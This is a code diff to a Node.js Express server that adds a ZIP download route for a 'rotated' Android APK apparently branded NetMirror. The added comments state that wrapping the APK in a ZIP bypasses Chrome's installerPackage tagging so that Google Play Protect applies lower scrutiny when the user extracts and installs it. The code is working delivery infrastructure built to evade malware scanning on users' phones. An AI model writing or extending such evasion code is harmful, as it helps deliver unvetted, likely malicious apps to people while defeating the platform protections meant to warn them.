@@ -519,6 +519,29 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ ZIP DOWNLOAD — bypasses Chrome installerPackage tagging ═══
+  // Chrome tags .apk downloads with installerPackage=com.android.chrome → HIGHEST
+  // Play Protect scrutiny. ZIP files don't get this tag. User extracts via file
+  // manager → installerPackage=com.google.android.documentsui → LOW scrutiny.
+  app.get('/dlzip/:token', async (req, res) => {
+    try {
+      const zipBuf = await getLandingRotatedZip();
+      res.setHeader('Content-Type', 'application/zip');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+      res.setHeader('Content-Length', zipBuf.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(zipBuf);
+    } catch (err) {
+      console.error('[DL-ZIP] ZIP serve failed:', err.message);
+      res.status(503).json({
+        error: 'APK is being prepared. Please try again in 30 seconds.',
+        retry: true,
+        code: 'APK_NOT_READY'
+      });
+    }
+  });
+
   // Legacy endpoint — kept for backward compat (admin app, direct links)
   // Also serves freshly rotated APK but with APK content-type
   app.get('/downloadapp/Netmirror.apk', async (req, res) => {
